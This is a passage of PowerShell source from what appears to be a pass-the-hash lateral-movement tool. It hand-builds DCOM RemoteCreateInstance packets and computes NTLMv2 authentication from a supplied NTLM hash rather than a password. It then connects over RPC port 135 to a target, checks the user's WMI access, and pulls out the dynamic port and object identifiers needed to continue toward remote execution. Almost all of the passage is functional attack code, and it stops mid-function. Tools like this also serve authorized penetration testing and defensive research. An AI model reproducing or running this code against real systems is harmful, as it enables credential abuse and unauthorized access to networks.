    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInfoCommonHeader",[Byte[]](0x01,0x10,0x08,0x00,0xcc,0xcc,0xcc,0xcc))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInfoPrivateHeader",[Byte[]](0x48,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInfoInstantiatedObjectClsId",[Byte[]](0x5e,0xf0,0xc3,0x8b,0x6b,0xd8,0xd0,0x11,0xa0,0x75,0x00,0xc0,0x4f,0xb6,0x88,0x20))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInfoClassContext",[Byte[]](0x14,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInfoActivationFlags",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInfoFlagsSurrogate",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInfoInterfaceIdCount",[Byte[]](0x01,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInfoInstantiationFlag",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInterfaceIdsPtr",[Byte[]](0x00,0x00,0x02,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationEntirePropertySize",[Byte[]](0x58,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationVersionMajor",[Byte[]](0x05,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationVersionMinor",[Byte[]](0x07,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInterfaceIdsPtrMaxCount",[Byte[]](0x01,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInterfaceIds",[Byte[]](0x18,0xad,0x09,0xf3,0x6a,0xd8,0xd0,0x11,0xa0,0x75,0x00,0xc0,0x4f,0xb6,0x88,0x20))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInterfaceIdsUnusedBuffer",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoCommonHeader",[Byte[]](0x01,0x10,0x08,0x00,0xcc,0xcc,0xcc,0xcc))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoPrivateHeader",[Byte[]](0x80,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoClientOk",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoReserved",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoReserved2",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoReserved3",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoClientPtrReferentID",[Byte[]](0x00,0x00,0x02,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoNULLPtr",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoClientPtrClientContextUnknown",[Byte[]](0x60,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoClientPtrClientContextCntData",[Byte[]](0x60,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoClientPtrClientContextOBJREFSignature",[Byte[]](0x4d,0x45,0x4f,0x57))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoClientPtrClientContextOBJREFFlags",[Byte[]](0x04,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoClientPtrClientContextOBJREFIID",[Byte[]](0xc0,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoClientPtrClientContextOBJREFCUSTOMOBJREFCLSID",[Byte[]](0x3b,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoClientPtrClientContextOBJREFCUSTOMOBJREFCBExtension",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoClientPtrClientContextOBJREFCUSTOMOBJREFSize",[Byte[]](0x30,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoUnusedBuffer",[Byte[]](0x01,0x00,0x01,0x00,0x63,0x2c,0x80,0x2a,0xa5,0xd2,0xaf,0xdd,0x4d,0xc4,0xbb,0x37,0x4d,0x37,0x76,0xd7,0x02,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoCommonHeader",[Byte[]](0x01,0x10,0x08,0x00,0xcc,0xcc,0xcc,0xcc))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoPrivateHeader",$packet_private_header)
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoAuthenticationFlags",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoServerInfoPtrReferentID",[Byte[]](0x00,0x00,0x02,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoNULLPtr",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoServerInfoServerInfoReserved",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoServerInfoServerInfoNameReferentID",[Byte[]](0x04,0x00,0x02,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoServerInfoServerInfoNULLPtr",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoServerInfoServerInfoReserved2",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoServerInfoServerInfoNameMaxCount",$packet_target_length)
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoServerInfoServerInfoNameOffset",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoServerInfoServerInfoNameActualCount",$packet_target_length)
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoServerInfoServerInfoNameString",$packet_target_unicode)
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesLocationInfoCommonHeader",[Byte[]](0x01,0x10,0x08,0x00,0xcc,0xcc,0xcc,0xcc))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesLocationInfoPrivateHeader",[Byte[]](0x10,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesLocationInfoNULLPtr",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesLocationInfoProcessID",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesLocationInfoApartmentID",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesLocationInfoContextID",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesScmRequestInfoCommonHeader",[Byte[]](0x01,0x10,0x08,0x00,0xcc,0xcc,0xcc,0xcc))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesScmRequestInfoPrivateHeader",[Byte[]](0x20,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesScmRequestInfoNULLPtr",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesScmRequestInfoRemoteRequestPtrReferentID",[Byte[]](0x00,0x00,0x02,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesScmRequestInfoRemoteRequestPtrRemoteRequestClientImpersonationLevel",[Byte[]](0x02,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesScmRequestInfoRemoteRequestPtrRemoteRequestNumProtocolSequences",[Byte[]](0x01,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesScmRequestInfoRemoteRequestPtrRemoteRequestUnknown",[Byte[]](0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesScmRequestInfoRemoteRequestPtrRemoteRequestProtocolSeqsArrayPtrReferentID",[Byte[]](0x04,0x00,0x02,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesScmRequestInfoRemoteRequestPtrRemoteRequestProtocolSeqsArrayPtrMaxCount",[Byte[]](0x01,0x00,0x00,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesScmRequestInfoRemoteRequestPtrRemoteRequestProtocolSeqsArrayPtrProtocolSeq",[Byte[]](0x07,0x00))
    $packet_DCOMRemoteCreateInstance.Add("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesScmRequestInfoUnusedBuffer",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00))

    return $packet_DCOMRemoteCreateInstance
}

function Get-UInt16DataLength
{
    param ([Int]$Start,[Byte[]]$Data)

    $data_length = [System.BitConverter]::ToUInt16($Data[$Start..($Start + 1)],0)

    return $data_length
}

if($hash -like "*:*")
{
    $hash = $hash.SubString(($hash.IndexOf(":") + 1),32)
}

if($Domain)
{
    $output_username = $Domain + "\" + $Username
}
else
{
    $output_username = $Username
}

if($Target -eq 'localhost')
{
    $Target = "127.0.0.1"
}

try
{
    $target_type = [IPAddress]$Target
    $target_short = $target_long = $Target
}
catch
{
    $target_long = $Target

    if($Target -like "*.*")
    {
        $target_short_index = $Target.IndexOf(".")
        $target_short = $Target.Substring(0,$target_short_index)
    }
    else
    {
        $target_short = $Target
    }

}

$process_ID = [System.Diagnostics.Process]::GetCurrentProcess() | Select-Object -expand id
$process_ID = [System.BitConverter]::ToString([System.BitConverter]::GetBytes($process_ID))
$process_ID = $process_ID -replace "-00-00",""
[Byte[]]$process_ID_bytes = $process_ID.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
Write-Verbose "Connecting to $Target`:135"
$WMI_client_init = New-Object System.Net.Sockets.TCPClient
$WMI_client_init.Client.ReceiveTimeout = 30000

try
{
    $WMI_client_init.Connect($Target,"135")
}
catch
{
    Write-Output "[-] $Target did not respond"
}

if($WMI_client_init.Connected)
{
    $WMI_client_stream_init = $WMI_client_init.GetStream()
    $WMI_client_receive = New-Object System.Byte[] 2048
    $RPC_UUID = 0xc4,0xfe,0xfc,0x99,0x60,0x52,0x1b,0x10,0xbb,0xcb,0x00,0xaa,0x00,0x21,0x34,0x7a
    $packet_RPC = New-PacketRPCBind 2 0xd0,0x16 0x02 0x00,0x00 $RPC_UUID 0x00,0x00
    $packet_RPC["FragLength"] = 0x74,0x00    
    $RPC = ConvertFrom-PacketOrderedDictionary $packet_RPC
    $WMI_client_send = $RPC
    $WMI_client_stream_init.Write($WMI_client_send,0,$WMI_client_send.Length) > $null
    $WMI_client_stream_init.Flush()    
    $WMI_client_stream_init.Read($WMI_client_receive,0,$WMI_client_receive.Length) > $null
    $assoc_group = $WMI_client_receive[20..23]
    $packet_RPC = New-PacketRPCRequest 0x03 0 0 0 0x02,0x00,0x00,0x00 0x00,0x00 0x05,0x00
    $RPC = ConvertFrom-PacketOrderedDictionary $packet_RPC
    $WMI_client_send = $RPC
    $WMI_client_stream_init.Write($WMI_client_send,0,$WMI_client_send.Length) > $null
    $WMI_client_stream_init.Flush()    
    $WMI_client_stream_init.Read($WMI_client_receive,0,$WMI_client_receive.Length) > $null
    $WMI_hostname_unicode = $WMI_client_receive[42..$WMI_client_receive.Length]
    $WMI_hostname = [System.BitConverter]::ToString($WMI_hostname_unicode)
    $WMI_hostname_index = $WMI_hostname.IndexOf("-00-00-00")
    $WMI_hostname = $WMI_hostname.SubString(0,$WMI_hostname_index)
    $WMI_hostname = $WMI_hostname -replace "-00",""
    $WMI_hostname = $WMI_hostname.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
    $WMI_hostname = New-Object System.String ($WMI_hostname,0,$WMI_hostname.Length)

    if($target_short -cne $WMI_hostname)
    {
        Write-Verbose "WMI reports target hostname as $WMI_hostname"
        $target_short = $WMI_hostname
    }

    $WMI_client_init.Close()
    $WMI_client_stream_init.Close()
    $WMI_client = New-Object System.Net.Sockets.TCPClient
    $WMI_client.Client.ReceiveTimeout = 30000

    try
    {
        $WMI_client.Connect($target_long,"135")
    }
    catch
    {
        Write-Output "[-] $target_long did not respond"
    }

    if($WMI_client.Connected)
    {
        $WMI_client_stream = $WMI_client.GetStream()
        $RPC_UUID = 0xa0,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46
        $packet_RPC = New-PacketRPCBind 3 0xd0,0x16 0x01 0x01,0x00 $RPC_UUID 0x00,0x00
        $packet_RPC["FragLength"] = 0x78,0x00
        $packet_RPC["AuthLength"] = 0x28,0x00
        $packet_RPC["NegotiateFlags"] = 0x07,0x82,0x08,0xa2
        $RPC = ConvertFrom-PacketOrderedDictionary $packet_RPC
        $WMI_client_send = $RPC
        $WMI_client_stream.Write($WMI_client_send,0,$WMI_client_send.Length) > $null
        $WMI_client_stream.Flush()    
        $WMI_client_stream.Read($WMI_client_receive,0,$WMI_client_receive.Length) > $null
        $assoc_group = $WMI_client_receive[20..23]
        $WMI_NTLMSSP = [System.BitConverter]::ToString($WMI_client_receive)
        $WMI_NTLMSSP = $WMI_NTLMSSP -replace "-",""
        $WMI_NTLMSSP_index = $WMI_NTLMSSP.IndexOf("4E544C4D53535000")
        $WMI_NTLMSSP_bytes_index = $WMI_NTLMSSP_index / 2
        $WMI_domain_length = Get-UInt16DataLength ($WMI_NTLMSSP_bytes_index + 12) $WMI_client_receive
        $WMI_target_length = Get-UInt16DataLength ($WMI_NTLMSSP_bytes_index + 40) $WMI_client_receive
        $WMI_session_ID = $WMI_client_receive[44..51]
        $WMI_NTLM_challenge = $WMI_client_receive[($WMI_NTLMSSP_bytes_index + 24)..($WMI_NTLMSSP_bytes_index + 31)]
        $WMI_target_details = $WMI_client_receive[($WMI_NTLMSSP_bytes_index + 56 + $WMI_domain_length)..($WMI_NTLMSSP_bytes_index + 55 + $WMI_domain_length + $WMI_target_length)]
        $WMI_target_time_bytes = $WMI_target_details[($WMI_target_details.Length - 12)..($WMI_target_details.Length - 5)]
        $NTLM_hash_bytes = (&{for ($i = 0;$i -lt $hash.Length;$i += 2){$hash.SubString($i,2)}}) -join "-"
        $NTLM_hash_bytes = $NTLM_hash_bytes.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
        $auth_hostname = (get-childitem -path env:computername).Value
        $auth_hostname_bytes = [System.Text.Encoding]::Unicode.GetBytes($auth_hostname)
        $auth_domain = $Domain
        $auth_domain_bytes = [System.Text.Encoding]::Unicode.GetBytes($auth_domain)
        $auth_username_bytes = [System.Text.Encoding]::Unicode.GetBytes($username)
        $auth_domain_length = [System.BitConverter]::GetBytes($auth_domain_bytes.Length)[0,1]
        $auth_domain_length = [System.BitConverter]::GetBytes($auth_domain_bytes.Length)[0,1]
        $auth_username_length = [System.BitConverter]::GetBytes($auth_username_bytes.Length)[0,1]
        $auth_hostname_length = [System.BitConverter]::GetBytes($auth_hostname_bytes.Length)[0,1]
        $auth_domain_offset = 0x40,0x00,0x00,0x00
        $auth_username_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + 64)
        $auth_hostname_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + 64)
        $auth_LM_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + $auth_hostname_bytes.Length + 64)
        $auth_NTLM_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + $auth_hostname_bytes.Length + 88)
        $HMAC_MD5 = New-Object System.Security.Cryptography.HMACMD5
        $HMAC_MD5.key = $NTLM_hash_bytes
        $username_and_target = $username.ToUpper()
        $username_and_target_bytes = [System.Text.Encoding]::Unicode.GetBytes($username_and_target)
        $username_and_target_bytes += $auth_domain_bytes
        $NTLMv2_hash = $HMAC_MD5.ComputeHash($username_and_target_bytes)
        $client_challenge = [String](1..8 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
        $client_challenge_bytes = $client_challenge.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}

        $security_blob_bytes = 0x01,0x01,0x00,0x00,
                                0x00,0x00,0x00,0x00 +
                                $WMI_target_time_bytes +
                                $client_challenge_bytes +
                                0x00,0x00,0x00,0x00 +
                                $WMI_target_details +
                                0x00,0x00,0x00,0x00,
                                0x00,0x00,0x00,0x00

        $server_challenge_and_security_blob_bytes = $WMI_NTLM_challenge + $security_blob_bytes
        $HMAC_MD5.key = $NTLMv2_hash
        $NTLMv2_response = $HMAC_MD5.ComputeHash($server_challenge_and_security_blob_bytes)
        $session_base_key = $HMAC_MD5.ComputeHash($NTLMv2_response)
        $NTLMv2_response = $NTLMv2_response + $security_blob_bytes
        $NTLMv2_response_length = [System.BitConverter]::GetBytes($NTLMv2_response.Length)[0,1]
        $WMI_session_key_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + $auth_hostname_bytes.Length + $NTLMv2_response.Length + 88)
        $WMI_session_key_length = 0x00,0x00
        $WMI_negotiate_flags = 0x15,0x82,0x88,0xa2

        $NTLMSSP_response = 0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00,
                                0x03,0x00,0x00,0x00,
                                0x18,0x00,
                                0x18,0x00 +
                                $auth_LM_offset +
                                $NTLMv2_response_length +
                                $NTLMv2_response_length +
                                $auth_NTLM_offset +
                                $auth_domain_length +
                                $auth_domain_length +
                                $auth_domain_offset +
                                $auth_username_length +
                                $auth_username_length +
                                $auth_username_offset +
                                $auth_hostname_length +
                                $auth_hostname_length +
                                $auth_hostname_offset +
                                $WMI_session_key_length +
                                $WMI_session_key_length +
                                $WMI_session_key_offset +
                                $WMI_negotiate_flags +
                                $auth_domain_bytes +
                                $auth_username_bytes +
                                $auth_hostname_bytes +
                                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 +
                                $NTLMv2_response

        $assoc_group = $WMI_client_receive[20..23]
        $packet_RPC = New-PacketRPCAUTH3 $NTLMSSP_response
        $RPC = ConvertFrom-PacketOrderedDictionary $packet_RPC
        $WMI_client_send = $RPC
        $WMI_client_stream.Write($WMI_client_send,0,$WMI_client_send.Length) > $null
        $WMI_client_stream.Flush()    
        $causality_ID = [String](1..16 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
        [Byte[]]$causality_ID_bytes = $causality_ID.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
        $unused_buffer = [String](1..16 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
        [Byte[]]$unused_buffer_bytes = $unused_buffer.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
        $packet_DCOM_remote_create_instance = New-PacketDCOMRemoteCreateInstance $causality_ID_bytes $target_short
        $DCOM_remote_create_instance = ConvertFrom-PacketOrderedDictionary $packet_DCOM_remote_create_instance
        $packet_RPC = New-PacketRPCRequest 0x03 $DCOM_remote_create_instance.Length 0 0 0x03,0x00,0x00,0x00 0x01,0x00 0x04,0x00
        $RPC = ConvertFrom-PacketOrderedDictionary $packet_RPC
        $WMI_client_send = $RPC + $DCOM_remote_create_instance
        $WMI_client_stream.Write($WMI_client_send,0,$WMI_client_send.Length) > $null
        $WMI_client_stream.Flush()    
        $WMI_client_stream.Read($WMI_client_receive,0,$WMI_client_receive.Length) > $null

        if($WMI_client_receive[2] -eq 3 -and [System.BitConverter]::ToString($WMI_client_receive[24..27]) -eq '05-00-00-00')
        {
            Write-Output "[-] $output_username WMI access denied on $target_long"    
        }
        elseif($WMI_client_receive[2] -eq 3)
        {
            $error_code = [System.BitConverter]::ToString($WMI_client_receive[27..24])
            $error_code = $error_code -replace "-",""
            Write-Output "[-] Error code 0x$error_code"
        }
        elseif($WMI_client_receive[2] -eq 2 -and !$WMI_execute)
        {
            Write-Output "[+] $output_username accessed WMI on $target_long"
        }
        elseif($WMI_client_receive[2] -eq 2)
        {
            
            Write-Verbose "[+] $output_username accessed WMI on $target_long"

            if($target_short -eq '127.0.0.1')
            {
                $target_short = $auth_hostname
            }

            $target_unicode = 0x07,0x00 + [System.Text.Encoding]::Unicode.GetBytes($target_short + "[")
            $target_search = [System.BitConverter]::ToString($target_unicode)
            $target_search = $target_search -replace "-",""
            $WMI_message = [System.BitConverter]::ToString($WMI_client_receive)
            $WMI_message = $WMI_message -replace "-",""
            $target_index = $WMI_message.IndexOf($target_search)

            if($target_index -lt 1)
            {
                $target_address_list = [System.Net.Dns]::GetHostEntry($target_long).AddressList

                ForEach($IP_address in $target_address_list)
                {
                    $target_short = $IP_address.IPAddressToString
                    $target_unicode = 0x07,0x00 + [System.Text.Encoding]::Unicode.GetBytes($target_short + "[")
                    $target_search = [System.BitConverter]::ToString($target_unicode)
                    $target_search = $target_search -replace "-",""
                    $target_index = $WMI_message.IndexOf($target_search)

                    if($target_index -gt 0)
                    {
                        break
                    }

                }

            }

            if($target_long -cne $target_short)
            {
                Write-Verbose "[*] Using $target_short for random port extraction"
            }

            if($target_index -gt 0)
            {
                $target_bytes_index = $target_index / 2
                $WMI_random_port = $WMI_client_receive[($target_bytes_index + $target_unicode.Length)..($target_bytes_index + $target_unicode.Length + 8)]
                $WMI_random_port = [System.BitConverter]::ToString($WMI_random_port)
                $WMI_random_port_end_index = $WMI_random_port.IndexOf("-5D")

                if($WMI_random_port_end_index -gt 0)
                {
                    $WMI_random_port = $WMI_random_port.SubString(0,$WMI_random_port_end_index)
                }

                $WMI_random_port = $WMI_random_port -replace "-00",""
                $WMI_random_port = $WMI_random_port.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
                [Int]$WMI_random_port_int = -join $WMI_random_port 
                $MEOW = [System.BitConverter]::ToString($WMI_client_receive)
                $MEOW = $MEOW -replace "-",""
                $MEOW_index = $MEOW.IndexOf("4D454F570100000018AD09F36AD8D011A07500C04FB68820")
                $MEOW_bytes_index = $MEOW_index / 2
                $OXID = $WMI_client_receive[($MEOW_bytes_index + 32)..($MEOW_bytes_index + 39)]
                $IPID = $WMI_client_receive[($MEOW_bytes_index + 48)..($MEOW_bytes_index + 63)]
                $OXID = [System.BitConverter]::ToString($OXID)
                $OXID = $OXID -replace "-",""
                $OXID_index = $MEOW.IndexOf($OXID,$MEOW_index + 100)
                $OXID_bytes_index = $OXID_index / 2
                $object_UUID = $WMI_client_receive[($OXID_bytes_index + 12)..($OXID_bytes_index + 27)]
                $WMI_client_random_port = New-Object System.Net.Sockets.TCPClient
                $WMI_client_random_port.Client.ReceiveTimeout = 30000
            }

            if($WMI_random_port)
            {

                Write-Verbose "[*] Connecting to $target_long`:$WMI_random_port_int"

                try
                {
                    $WMI_client_random_port.Connect($target_long,$WMI_random_port_int)
                }
                catch
                {
                    Write-Output "[-] $target_long`:$WMI_random_port_int did not respond"
                }

            }
            else
            {
                Write-Output "[-] Random port extraction failure"
            }

        }
        else
        {
            Write-Output "[-] Something went wrong"
        }

        if($WMI_client_random_port.Connected)
        {
            $WMI_client_random_port_stream = $WMI_client_random_port.GetStream()
            $packet_RPC = New-PacketRPCBind 2 0xd0,0x16 0x03 0x00,0x00 0x43,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46 0x00,0x00
            $packet_RPC["FragLength"] = 0xd0,0x00
            $packet_RPC["AuthLength"] = 0x28,0x00
            $packet_RPC["AuthLevel"] = 0x04
            $packet_RPC["NegotiateFlags"] = 0x97,0x82,0x08,0xa2
            $RPC = ConvertFrom-PacketOrderedDictionary $packet_RPC
            $WMI_client_send = $RPC
            $WMI_client_random_port_stream.Write($WMI_client_send,0,$WMI_client_send.Length) > $null
            $WMI_client_random_port_stream.Flush()    
            $WMI_client_random_port_stream.Read($WMI_client_receive,0,$WMI_client_receive.Length) > $null
            $assoc_group = $WMI_client_receive[20..23]
            $WMI_NTLMSSP = [System.BitConverter]::ToString($WMI_client_receive)
            $WMI_NTLMSSP = $WMI_NTLMSSP -replace "-",""
            $WMI_NTLMSSP_index = $WMI_NTLMSSP.IndexOf("4E544C4D53535000")
            $WMI_NTLMSSP_bytes_index = $WMI_NTLMSSP_index / 2
            $WMI_domain_length = Get-UInt16DataLength ($WMI_NTLMSSP_bytes_index + 12) $WMI_client_receive
            $WMI_target_length = Get-UInt16DataLength ($WMI_NTLMSSP_bytes_index + 40) $WMI_client_receive
            $WMI_session_ID = $WMI_client_receive[44..51]
            $WMI_NTLM_challenge = $WMI_client_receive[($WMI_NTLMSSP_bytes_index + 24)..($WMI_NTLMSSP_bytes_index + 31)]
            $WMI_target_details = $WMI_client_receive[($WMI_NTLMSSP_bytes_index + 56 + $WMI_domain_length)..($WMI_NTLMSSP_bytes_index + 55 + $WMI_domain_length + $WMI_target_length)]
            $WMI_target_time_bytes = $WMI_target_details[($WMI_target_details.Length - 12)..($WMI_target_details.Length - 5)]
            $NTLM_hash_bytes = (&{for ($i = 0;$i -lt $hash.Length;$i += 2){$hash.SubString($i,2)}}) -join "-"
            $NTLM_hash_bytes = $NTLM_hash_bytes.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
            $auth_hostname = (Get-ChildItem -path env:computername).Value
